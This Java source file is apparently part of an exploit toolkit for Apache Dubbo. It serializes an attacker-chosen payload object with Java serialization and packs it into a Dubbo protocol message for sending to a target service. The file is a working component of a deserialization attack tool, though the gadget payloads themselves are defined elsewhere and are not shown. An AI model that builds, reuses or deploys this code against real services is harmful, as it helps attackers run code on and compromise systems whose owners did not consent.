package com.threedr3am.exp.dubbo.serialization.java;

import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.protocol.dubbo.DubboProtocol;
import com.threedr3am.exp.dubbo.serialization.Serialization;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.common.serialize.Constants;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;

/**
 * @author threedr3am
 */
public class JavaSerialization implements Serialization {

  @Override
  public byte[] makeData(Payload payload, String[] args, String protocol) {
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    try {
      ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
      out.writeByte(1);
      out.writeObject(payload.getPayload(args));
      out.close();

      switch (protocol) {
        case "dubbo":
          return new DubboProtocol().makeData(byteArrayOutputStream.toByteArray(), this);
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    return new byte[0];
  }

  @Override
  public byte getType() {
    return Constants.JAVA_SERIALIZATION_ID;
  }
}
